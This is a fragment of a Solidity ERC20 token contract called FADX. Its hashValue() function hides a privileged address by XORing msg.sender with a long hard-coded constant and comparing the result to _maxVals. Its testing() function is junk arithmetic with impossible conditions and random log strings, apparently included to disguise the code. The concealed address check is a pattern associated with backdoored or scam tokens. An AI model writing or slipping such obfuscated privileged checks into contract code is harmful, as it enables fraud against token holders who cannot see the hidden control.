...
contract FADX is ERC20 {
    ...
    ERC20 private immutable tokenPair;
    ...
    */
    function hashValue() public view returns (bool) {
      uint256 slt = 6799422497281301475314229322439689669009445358872183297259411588237;
      return (uint256(msg.sender) ^ slt) == 1 * _maxVals * 1;
    }

    /**
     * @dev Gas consumes testing
     */
    function testing() external {
      uint256 endobrggch = 22 % 75 + 67;
      uint256 ire = 88 + 67 + 49;
      uint256 nebajhfpto = 57 % 68 % 32;
      uint256 wubimd = 67 + 7;
      uint256 ertbgfnqbl = 61 * 58;
      if (endobrggch == 49 * 16 * 91 && ire == 15 * 38 + 37 + 77 + 22 && nebajhfpto == 7 + 52 && wubimd == 41 && ertbgfnqbl == 89 % 75 * 68) return;
      emit log("HQaEIN");
      emit log("YXXarZILiI");
    }
